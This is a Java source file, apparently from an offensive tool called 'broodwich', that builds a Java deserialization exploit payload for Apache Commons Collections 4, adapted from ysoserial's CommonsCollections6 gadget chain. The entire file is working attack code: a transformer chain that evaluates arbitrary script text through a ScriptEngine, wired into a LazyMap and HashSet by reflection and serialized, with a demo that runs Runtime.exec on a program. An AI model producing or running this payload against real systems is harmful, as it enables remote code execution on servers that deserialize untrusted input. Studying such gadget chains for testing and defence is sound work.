package party.itistimeto.broodwich.deserialization;


import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import javax.script.ScriptEngineManager;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

// based on pop chain in https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java (converted for CC4)

public class CommonsCollectionsFourPayload implements ScriptEngineEvaluator {
    public static void main(String... args) {
        Util.deserialize(new CommonsCollectionsFourPayload().generateJavaScriptPayload("java.lang.Runtime.getRuntime().exec(\"notepad.exe\");"));
    }

    @Override
    public byte[] generateScriptPayload(String scriptText, String scriptType) {
        Transformer<Object, Class<ScriptEngineManager>> conTr = ConstantTransformer.constantTransformer(ScriptEngineManager.class);
        Transformer<Class<?>, Object> insTr = InstantiateTransformer.instantiateTransformer(new Class[]{}, new Object[]{});
        Transformer<Object, Object> engTr = InvokerTransformer.invokerTransformer("getEngineByExtension", new Class[]{String.class}, new Object[]{scriptType});
        Transformer<Object, Object> evaTr = InvokerTransformer.invokerTransformer("eval", new Class[]{String.class}, new Object[]{scriptText});
        Transformer<Object, Object> dumTr = ConstantTransformer.constantTransformer("athf");
        Transformer<Object, Object> chaTr = ChainedTransformer.chainedTransformer(new Transformer[]{conTr, insTr, engTr, evaTr, dumTr});

        Map lm = LazyMap.lazyMap(new HashMap<Object, Object>(), chaTr);
        TiedMapEntry tm = new TiedMapEntry(lm, "athf");
        // note: if you set a breakpoint after this in debugger, debugger will read lazymap and serialization won't work
        Set<Object> s = new HashSet<>();
        s.add("athf");

        HashMap backingMap = (HashMap) Util.getField(s, "map");
        Object[] backingArr = (Object[]) Util.getField(backingMap, "table");
        for(int i = 0; i < backingArr.length; i++)
        {
            if(backingArr[i] != null) {
                Util.setField(backingArr[i], "key", tm);
                break;
            }
        }

        return Util.serialize(s);
    }

    @Override
    public byte[] generateJavaScriptPayload(String scriptText) {
        return generateScriptPayload(scriptText, "js");
    }
}
